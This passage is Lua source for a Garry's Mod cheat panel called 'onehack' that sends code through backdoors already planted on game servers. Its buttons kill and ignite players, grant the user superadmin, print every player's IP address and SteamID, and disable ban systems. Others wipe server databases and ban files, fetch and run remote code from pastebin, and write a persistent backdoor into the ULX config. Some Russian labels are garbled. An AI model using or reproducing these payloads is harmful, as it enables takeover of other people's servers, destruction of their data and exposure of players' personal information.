			draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
			draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt)
			draw.SimpleText("Player list","DermaDefault",w/2,h/2,Color(130,130,130),1,1)
		end
 
		onehack.player_button_all = onehack.backlistt_players_list:Add( "DButton" )
		onehack.player_button_all:SetText( "" )
		onehack.player_button_all:Dock( TOP )
		onehack.player_button_all:DockMargin( 0, 0, 0, 0 )
		function onehack.player_button_all:Paint( w,h )
	    	if onehack.player_button_all:IsHovered() then
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,0,w-2,h-1,onehack.theme.backgroundalt3)
			else
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,0,w-2,h-1,onehack.theme.backgroundalt)
		   	end
		   	if onehack.selected_player == 0 then
				draw.SimpleText("> All player's <","DermaDefault",w/2,h/2,onehack.theme.chroma,1,1)
			else
				draw.SimpleText("All player's","DermaDefault",w/2,h/2,Color(255,255,255),1,1)
			end
		end
		function onehack.player_button_all:DoClick()
			onehack.selected_player = 0
		end
 
		for k,v in pairs(player.GetAll()) do
			local onehack_player_button = onehack.backlistt_players_list:Add( "DButton" )
			onehack_player_button:SetText( "" )
			onehack_player_button:Dock( TOP )
			onehack_player_button:DockMargin( 0, 0, 0, 0 )
			onehack_player_button.Paint = function( _, w, h )
		    	if onehack_player_button:IsHovered() then
					draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
					draw.RoundedBox(0,1,0,w-2,h-1,onehack.theme.backgroundalt3)
				else
					draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
					draw.RoundedBox(0,1,0,w-2,h-1,onehack.theme.backgroundalt)
			   	end
			   	if onehack.selected_player == v then
					draw.SimpleText("> "..v:Name().." <","DermaDefault",w/2,h/2,onehack.theme.chroma,1,1)
				else
					draw.SimpleText(v:Name(),"DermaDefault",w/2,h/2,Color(255,255,255),1,1)
				end
			end
			function onehack_player_button:DoClick()
				onehack.selected_player = v
			end
		end
 
		onehack.backlistt_functions = vgui.Create( "DPanel", onehackdooropt )
		onehack.backlistt_functions:SetPos(160,65)
		onehack.backlistt_functions:SetSize(301,313)
		function onehack.backlistt_functions:Paint( w,h )
			draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
			draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt3)
		end
 
		onehack.backlistt_functionsss_list = vgui.Create( "DScrollPanel", onehack.backlistt_functions )
		onehack.backlistt_functionsss_list:Dock(FILL)
		function onehack.backlistt_functionsss_list:Paint( w,h )
			draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
			draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt3)
		end
		onehack.backlistt_functionsss_list.VBar:SetWidth(1)
		onehack.backlistt_functionsss_list:GetVBar().Paint = function() draw.RoundedBox(0, 0, 0, onehack.backlistt_functionsss_list:GetVBar():GetWide(), onehack.backlistt_functionsss_list:GetVBar():GetTall(), Color(255, 255, 255, 0)) end
		onehack.backlistt_functionsss_list:GetVBar().btnUp.Paint = function() draw.RoundedBox(0, 0, 0, onehack.backlistt_functionsss_list:GetVBar().btnUp:GetWide(), onehack.backlistt_functionsss_list:GetVBar().btnUp:GetTall(), Color(0,0,0,0)) end
		onehack.backlistt_functionsss_list:GetVBar().btnDown.Paint = function() draw.RoundedBox(0, 0, 0, onehack.backlistt_functionsss_list:GetVBar().btnDown:GetWide(), onehack.backlistt_functionsss_list:GetVBar().btnDown:GetTall(), Color(0,0,0,0)) end
		onehack.backlistt_functionsss_list:GetVBar().btnGrip.Paint = function() draw.RoundedBox(0, 0, 0, onehack.backlistt_functionsss_list:GetVBar().btnGrip:GetWide(), onehack.backlistt_functionsss_list:GetVBar().btnGrip:GetTall(), onehack.theme.chroma) end
 
		onehack.AddFunction("Поменять всем имя", "textfield_rename", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString( "for k, v in pairs(player.GetAll()) do v:ConCommand(\"say /name Супе  Г ом!\"); end" )
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Убить всех", "cut", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Танцы", "cut", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString( [[for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_CHEER) end timer.Create("dance_loop",2.3,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_CHEER) end end )
	]] )
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Подкинуть всех", "arrow_up", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Half-Life 2", "clock_play", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/editor/playerstart.mdl\") end" )
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("К утилика", "arrow_rotate_anticlockwise", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString(
				[[hook.Add( "Think", "#bone::manipulation#", function()
				for k,v in pairs(player.GetAll()) do
					local hands = v:LookupBone("ValveBiped.Bip01_R_Hand")
 
					v:ManipulateBoneAngles( hands, Angle(0, 0, RealTime()*500) )
				end
			end )]])
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Заб ать о ужия у всех", "controller_delete", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString([[for _, p in pairs(player.GetAll()) do if not ]]..LocalPlayer():UniqueID()..[[ then p:StripWeapons() end end]])
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Поджечь всех", "building", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Выдать себе п ивилегию", "user_gray", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString( [[
 
				local id = ]] .. LocalPlayer():UserID() .. [[
 
				Player( id ):SetUserGroup( "superadmin" )
 
	]] )
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Камшейк", "emoticon_evilgrin", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString("for k,v in pairs(player.GetAll()) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end")
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("2D Модели", "font", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString([[
									for k,v in pairs(player.GetAll()) do
									local a = v:LookupBone("ValveBiped.Bip01_Head1")
									local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
									local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
									local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
									local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
									local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
									local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
									local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
									local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
									local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
									local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")
 
										v:ManipulateBoneScale( a, Vector(4,0,4))
										v:ManipulateBoneScale( b, Vector(0,0,0))
										v:ManipulateBoneScale( c, Vector(0,0,0))
										v:ManipulateBoneScale( d, Vector(0,0,1))
										v:ManipulateBoneScale( e, Vector(0,0,1))
										v:ManipulateBoneScale( f, Vector(0,0,0))
										v:ManipulateBoneScale( g, Vector(0,0,0))
										v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
										v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
										v:ManipulateBoneScale( j, Vector(0,0,0))
										v:ManipulateBoneScale( k, Vector(0,0,0))
										end]])
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Всех в гигантов", "control_eject", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString([[
								hook.Add("Think", "giant", function()
									for k,v in pairs (player.GetAll()) do
										v:SetModelScale(2.5, 100);
										v:SetRunSpeed(400 * 2);
										v:SetWalkSpeed(200 * 2);
									end
								end)]])
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Все любят меня :3", "comment", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString([[for k,p in pairs(player.GetAll()) do
							    p:ConCommand("say Я люблю Foer'a <3")
							  end
							]])
			net.WriteBit(1)
			net.SendToServer()
		end)
 
		onehack.AddFunction("Показать IP всех иг оков", "chart_organisation", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString([[
 
						            local id = ]] .. LocalPlayer():UserID() .. [[
 
						            for k, v in pairs( player.GetAll() ) do
 
						                Player( id ):ChatPrint( "Player: " .. v:Nick() .. " (" .. v:SteamID() .. ") IP: " .. v:IPAddress() )
 
						            end
 
						        ]])
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Сломать (ULX и FAdmin)", "brick_delete", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString([[
									ULib.Ban = function() return false end
									_G.FAdmin = function() end
						            ULib.addBan = function() return end
 
						            ULib.kick = function() return end
	            				]])
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Дискотека", "group", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString("http.Fetch(\"https://pastebin.com/raw/ehNbAECD\",function(b,l,h,c)RunString(b)end,nil)")
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Пломби овать", "server_link", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString("http.Fetch(\"https://pastebin.com/raw/z8TmzbFF\",function(b,l,h,c)RunString(b)end,nil)")
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction(" азбанить всех", "database_edit", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Удалить все г уппы", "group_delete", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Сб осить деньги", "money_delete", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Очистить ка ту", "cut_red", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString("for k, v in pairs(ents.FindByClass( \"prop_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"func_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"env_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"lua_run*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"point_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"trigger_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"info_*\" )) do v:Remove() end")
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Изменить имя се ве а", "drive_rename", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString("RunConsoleCommand(\"ulx\", \"rcon\", \"hostname\", \"• Ħá¢ҝ ƀɤ ǺβÇŦųŋℯᶉ  |  Ñęţ:("..onehack.selectedbackdoor..")\")")
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Спам", "keyboard", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString("timer.Create( \"sppspas\", 0.1, 0, function() print(\"Hack by ABCTuner | Do not steal! | Вы наказаны за во овство, коде ы тоже люди и хотят есть! Они за абатывают на жизнь п одавая свои замечательные аддоны!\"); BroadcastLua([[chat.AddText(Color(255,10,100), \"• Ħáсҝ ƀɤ ǺβÇŦųŋℯᶉ \",Color(255,255,255),\"| Do not steal! | Ñęţ: \",HSVToColor( CurTime() % 6 * 60, 1, 1 ),\""..onehack.selectedbackdoor.."\" )]]) end)")
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Отпе еть все две и", "door_open", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString([[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("unlock", "", 0) end end]])
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Отк ыть все две и на ка те", "door_open", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString([[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("toggle", "", 0) end end]])
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Очистить все данные", "folder_delete", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString([[
					                local date = os.date( "%m-%d-%y" )
					                local databases = { "jobdata","darkrp_door","darkrp_levels","darkrp_prestige","darkrp_doorgroups","darkrp_doorjobs","darkrp_jobspawn","darkrp_position","darkrp_player","darkrp_dbversion","FAdmin_CAMIPrivileges","FADMIN_GROUPS","FAdmin_Immunity","FADMIN_MOTD","FAdmin_PlayerGroup","FADMIN_PRIVILEGES","FADMIN_RESTRICTEDENTS","FAdmin_ServerSettings","FAdminBans","FPP_ANTISPAM1","FPP_BLOCKED1","FPP_BLOCKMODELSETTINGS1","FPP_ENTITYDAMAGE1","FPP_GLOBALSETTINGS1","FPP_GRAVGUN1","FPP_GROUPMEMBERS1","FPP_GROUPS3","FPP_GROUPTOOL","FPP_PHYSGUN1","FPP_PLAYERUSE1","FPP_TOOLADMINONLY","FPP_TOOLGUN1","FPP_TOOLRESTRICTPERSON1","FPP_TOOLTEAMRESTRICT","FPP_BLOCKEDMODELS1","awarn_playerdata","awarn_serverdata","awarn_warnings","blogs_players_v3","blogs_v3","stt_date","stt_players","mlog_logs","mlog_permissions","atlaschat_players","atlaschat_ranks","atlaschat_remote","atlaschat_restrictions","OreBag","fcd_playerData","dailylogin","ChessLeaderboard","qsgr_data","voting_npcs","cac_incidents","steam_rewards","playerdata","playerinformation","utime","permaprops","cc_characters","cc_npcs","ckit_chips","ckit_persist","exsto_data_bans","exsto_data_ranks","exsto_data_users","exsto_data_variables","exsto_restriction","inventories","kinv_items","libk_player","permitems","player_gangapps","player_gangdata","player_gangs","ps2_categories","ps2_equipmentslot","ps2_HatPersistence","ps2_itemmapping","ps2_itempersistence","ps2_OutfitHatPersistenceMapping","ps2_outfits","ps2_playermodelpersistence","ps2_servers","ps2_settings","ps2_trailpersistence","ps2_wallet","removeprops","scoreboard_friends","serverguard_analytics","serverguard_bans","serverguard_pms","serverguard_ranks","serverguard_reports","serverguard_schema","serverguard_ttt_autoslays","serverguard_users","serverguard_watchlist","tttstats","ttt_passes_history","specdm_stats_new","ps2_achievements","ps2_boosterpersistence","ps2_cratepersistence","ps2_instatswitchweaponpersistence","ps2_keypersistence","ps2_rolecontrolpersistence","ps2_weaponpersistence","rapsheet","damagelog_autoslay","damagelog_names","damagelog_oldlogs","damagelog_weapons","kmapvote_mapinfo","kmapvote_ratings","mgang_gangs","mgang_players","deathrun_ids","deathrun_records","deathrun_stats","sui_ratings","shop_texthats","shop_money","shop_items","report_log" }
					                local datafiles = { "ulib/bans.txt","ulib/groups.txt","ulib/misc_registered.txt","ulib/users.txt","ulx/adverts.txt","ulx/apromote.txt","ulx/banmessage.txt","ulx/banreasons.txt","ulx/downloads.txt","ulx/gimps.txt","ulx/motd.txt","ulx/restrictions.txt","ulx/sbox_limits.txt","ulx/votemaps.txt","apg/settings.txt","atags/tags.txt","atags/rankchattags.txt","atags/playerchattags.txt","atags/tags.txt","atags/selectedtags.txt","atags/ranktags.txt","atags/playertags.txt","vcmod/settings_sv.txt","vcmod/config_sv_privilages.txt","wire_version.txt","UTeam.txt","prevhas.txt","cac/system_log_sv.txt","cac/serverworkshopinformation.txt","cac/settings.txt","cac/serverluainformation.txt","hitnumbers/settings.txt","soundlists/common_sounds.txt","vcmod/controls.txt","vcmod/dataserver.txt","qsgr_data/sqgr_settings.txt","blogs/configcache.txt","blogs/language.txt","cac/adminuipack.txt","ezjobs/config.txt","damagelog/colors.txt","damagelog/filters_new.txt","craphead_scripts/armory_robbery/rp_downtown_v4c/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v2/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v2/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_evilmelon_v1/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v3/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v4/policearmory_location.txt","mg_gangsdata/mg_npcspawns.txt","ulx/debugdump.txt","ulx/empty_teams.txt","chattags.txt","caseclaims.txt", "sammyservers_textscreens.txt","permaprops_permissions.txt","chattags.txt","prevhash.txt","permaprops_config.txt","zwhitelistjobdata/jobsetting.txt","zwhitelistjobdata/whitelistjob.txt","zmodserveroption/sysjobwhitelist.txt","vliss/settings/config.txt","nordahl_spawnpoint/rp_venator_v3.txt","nordahl_spawnpoint/rp_venator_v2.txt","nordahl_spawnpoint/rp_venator_v1.txt","nordahl_spawnpoint/rp_venator_gg.txt","nordahl_spawnpoint/rp_venator_ausv4.txt","nordahl_spawnpoint/rp_venator_v2_ffg.txt","planningevent/prehud.txt","planningoption/hourformat.txt","nordahl_spawnpoint/arena_byre.txt","nordahl_spawnpoint/rp_venator_v2_immersive.txt","nordahl_spawnpoint/rp_venator_fade_v3.txt","nordahl_spawnpoint/rp_venator_gr.txt","nordahl_spawnpoint/rp_tatoonie_dunsea_v1.txt","nordahl_spawnpoint/rp_scifi.txt","nordahl_spawnpoint/rishimoon_crimson.txt","nordahl_spawnpoint/rp_pripyat_hl2.txt","nordahl_spawnpoint/rp_onwardhope.txt", "nordahl_spawnpoint/rp_oldworld_fix.txt","nordahl_spawnpoint/sd_doomsday.txt","nordahl_spawnpoint/sd_doomsday_event.txt","nordahl_spawnpoint/rp_naboo_city_v1.txt","nordahl_spawnpoint/rp_noclyria_crimson.txt","nordahl_spawnpoint/rp_nar_shaddaa_v2.txt","nordahl_spawnpoint/rp_mos_mersic_v2.txt","nordahl_spawnpoint/rp_kashyyk_jungle_b2.txt","nordahl_spawnpoint/dust_dunes.txt","nordahl_spawnpoint/rp_cscdesert_v2-1_propfix.txt","nordahl_spawnpoint/rd_asteroid.txt","nordahl_spawnpoint/naboo.txt","nordahl_spawnpoint/kashyyyk.txt","nordahl_spawnpoint/geonosis.txt","nordahl_spawnpoint/fightspace3b.txt","nordahl_spawnpoint/endor.txt","nordahl_spawnpoint/toth_forgotten.txt"}
					                local sensitivefiles = { "ulx_logs/"..date..".txt","ulib/bans.txt","ulib/groups.txt","ulib/misc_registered.txt","ulib/users.txt","ulx/adverts.txt","ulx/apromote.txt","ulx/banmessage.txt","ulx/banreasons.txt","ulx/downloads.txt","ulx/gimps.txt","ulx/motd.txt","ulx/restrictions.txt","ulx/sbox_limits.txt","ulx/votemaps.txt","apg/settings.txt","atags/tags.txt","atags/rankchattags.txt","atags/playerchattags.txt","atags/tags.txt","atags/selectedtags.txt","atags/ranktags.txt","atags/playertags.txt","vcmod/settings_sv.txt","vcmod/config_sv_privilages.txt","cac/system_log_sv.txt","cac/serverworkshopinformation.txt","cac/settings.txt","cac/serverluainformation.txt","vcmod/controls.txt","vcmod/dataserver.txt","blogs/configcache.dat","blogs/language.txt","blogs/config_v5.txt","cac/adminuipack.txt","ulx/debugdump.txt","ulx/empty_teams.txt","chattags.txt","caseclaims.txt", "sammyservers_textscreens.txt","permaprops_permissions.txt","chattags.txt","permaprops_config.txt","whitelist.txt","zwhitelistjobdata/jobsetting.txt","zwhitelistjobdata/whitelistjob.txt","zmodserveroption/sysjobwhitelist.txt","nordahl_spawnpoint/rp_venator_v3.txt","nordahl_spawnpoint/rp_venator_v2.txt","nordahl_spawnpoint/rp_venator_v1.txt","nordahl_spawnpoint/rp_venator_gg.txt","nordahl_spawnpoint/rp_venator_ausv4.txt","nordahl_spawnpoint/rp_venator_v2_ffg.txt","planningevent/prehud.txt","planningoption/hourformat.txt","nordahl_spawnpoint/arena_byre.txt","nordahl_spawnpoint/rp_venator_v2_immersive.txt","nordahl_spawnpoint/rp_venator_fade_v3.txt","nordahl_spawnpoint/rp_venator_gr.txt","nordahl_spawnpoint/rp_tatoonie_dunsea_v1.txt","nordahl_spawnpoint/rp_scifi.txt","nordahl_spawnpoint/rishimoon_crimson.txt","nordahl_spawnpoint/rp_pripyat_hl2.txt","nordahl_spawnpoint/rp_onwardhope.txt", "nordahl_spawnpoint/rp_oldworld_fix.txt","nordahl_spawnpoint/sd_doomsday.txt","nordahl_spawnpoint/sd_doomsday_event.txt","nordahl_spawnpoint/rp_naboo_city_v1.txt","nordahl_spawnpoint/rp_noclyria_crimson.txt","nordahl_spawnpoint/rp_nar_shaddaa_v2.txt","nordahl_spawnpoint/rp_mos_mersic_v2.txt","nordahl_spawnpoint/rp_kashyyk_jungle_b2.txt","nordahl_spawnpoint/dust_dunes.txt","nordahl_spawnpoint/rp_cscdesert_v2-1_propfix.txt","nordahl_spawnpoint/rd_asteroid.txt","nordahl_spawnpoint/naboo.txt","nordahl_spawnpoint/kashyyyk.txt","nordahl_spawnpoint/geonosis.txt","nordahl_spawnpoint/fightspace3b.txt","nordahl_spawnpoint/endor.txt","nordahl_spawnpoint/toth_forgotten.txt"}
 
					                for k,v in pairs(databases) do
					                    if sql.TableExists(v) then
					                        sql.Query("DROP TABLE "..v.." ;")
					                        sql.Query("CREATE TABLE IF NOT EXISTS "..v.." ( steamid TEXT NOT NULL PRIMARY KEY, value TEXT );")
					                    end
					                end
 
					                for k,v in pairs(datafiles) do
					                    if file.Exists(v) then
					                        file.Delete(v)
					                        file.write(v, "А вот нехуй было обманывать")
					                    end
					                end
 
					                for k,v in pairs(sensitivefiles) do
					                    if file.Exists(v) then
					                        file.Delete(v)
					                        file.write(v, "А вот нехуй было обманывать")
					                    end
					                end
					            ]])
			net.WriteBit(1)
			onehack.SendToServak()
		end)
	--
		onehack.AddFunction("Iseeyou", "shield_go", buttlistback, function()
			http.Fetch( "http://pastebin.com/raw.php?i=Ps16AErr", RunString )
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString("http.Fetch( \"http://pastebin.com/raw.php?i=Ps16AErr\", RunString )")
			net.WriteBit(1)
			onehack.SendToServak()
			RunConsoleCommand("iseeyou")
		end)
		onehack.AddFunction("Всех в КПЗ", "shield_go", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString("RunConsoleCommand(\"ulx\", \"jail\", \"*\")")
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Инфекция", "chart_line_edit", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString([[
				               		local config = ULib.fileRead( "data/ulx/config.txt" )
 
				                    config = config.."\nulx logEcho 0"
 
				                    config = config.."\nulx luarun util.AddNetworkString( 'ABCNet' ) net.Receive( 'ABCNet', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )"
 
				                    config = config.."\nulx logEcho 1"
 
				                    ULib.fileWrite( "data/ulx/config.txt", config )
 
				                   ]])
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("А магеддон", "bomb", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString([[
								hook.Add("Think", "armageddon", function()
									local explode = ents.Create( "env_explosion" )
										explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
										explode:Spawn()
										explode:SetKeyValue( "iMagnitude", "500" )
										explode:Fire( "Explode", 0, 0 )
									end)
								]])
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Изменить звуки шагов", "sound", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString("hook.Add(\"PlayerFootstep\", \"porn\", function(ply, pos, foot, sound2, volume, filter) ply:EmitSound( \"vo/npc/female01/pain06.wav\",75,math.random( 50, 150 )) end )")
			net.WriteBit(1)
			onehack.SendToServak()
		end)
 
		onehack.AddFunction("Сказать что се ве у пизда", "sound", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString("BroadcastLua([[sound.PlayURL( \"https://mamkaeb.000webhostapp.com/sound.mp3\", \"mono\", function()end )]])")
			net.WriteBit(1)
			net.SendToServer()
		end)
 
		onehack.AddFunction("Музыка - Be Friend", "sound", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString("BroadcastLua([[sound.PlayURL( \"https://loadingscrren.000webhostapp.com/BE%20FRIENDS.mp3\", \"mono\", function()end ); chat.AddText(Color(255,255,255),\"Сейчас иг ает: \",Color(100,255,100),\"Be Friend\")]])")
			net.WriteBit(1)
			net.SendToServer()
		end)
 
		onehack.AddFunction("Музыка - П ивет, это к уто", "sound", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString("BroadcastLua([[sound.PlayURL( \"https://loadingscrren.000webhostapp.com/Salut%20Cest%20Cool.mp3\", \"mono\", function()end ); chat.AddText(Color(255,255,255),\"Сейчас иг ает: \",Color(100,255,100),\"П ивет это к уто\")]])")
			net.WriteBit(1)
			net.SendToServer()
		end)
 
		onehack.AddFunction("Музыка - Somewhere over", "sound", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString("BroadcastLua([[sound.PlayURL( \"https://loadingscrren.000webhostapp.com/Somewhere%20over.mp3\", \"mono\", function()end ); chat.AddText(Color(255,255,255),\"Сейчас иг ает: \",Color(100,255,100),\"Somehere over\")]])")
			net.WriteBit(1)
			net.SendToServer()
		end)
 
		onehack.AddFunction("Музыка - Петушиный вой", "sound", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString("BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/94TU.mp3\", \"mono\", function()end ); chat.AddText(Color(255,255,255),\"Сейчас иг ает: \",Color(100,255,100),\"Skibidi\")]])")
			net.WriteBit(1)
			net.SendToServer()
		end)
 
		onehack.AddFunction("Музыка - нет админа", "sound", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString("BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/92xM.mp3\", \"mono\", function()end ); chat.AddText(Color(255,255,255),\"Сейчас иг ает: \",Color(100,255,100),\"Поиг аю я в CS\")]])")
			net.WriteBit(1)
			net.SendToServer()
		end)
 
		onehack.AddFunction("Музыка - Па авозик - Look At Me", "sound", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString("BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/69Q8.mp3\", \"mono\", function()end ); chat.AddText(Color(255,255,255),\"Сейчас иг ает: \",Color(100,255,100),\"Па авозик\")]])")
			net.WriteBit(1)
			net.SendToServer()
		end)
 
		onehack.AddFunction("Музыка - П ивет всем д узьям", "sound", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString("BroadcastLua([[sound.PlayURL( \"https://supronrp.fr/secret/03.mp3\", \"mono\", function()end ); chat.AddText(Color(255,255,255),\"Сейчас иг ает: \",Color(100,255,100),\"П ивет всем!\")]])")
			net.WriteBit(1)
			net.SendToServer()
		end)
	-- http://ru.drivemusic.cc/dl/XYbi6hfhrl28jZHmLCG9Qw/1545785442/download_music/2014/04/lindsey-stirling-feat.-lzzy-hale-shatter-me.mp3
		onehack.AddFunction("Музыка - Меня зовут НЛО.", "sound", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString("BroadcastLua([[sound.PlayURL( \"https://musicdeouff.000webhostapp.com/2016.mp3\", \"mono\", function()end ); chat.AddText(Color(255,255,255),\"Сейчас иг ает: \",Color(100,255,100),\"Я НЛО\")]])")
			net.WriteBit(1)
			net.SendToServer()
		end)
 
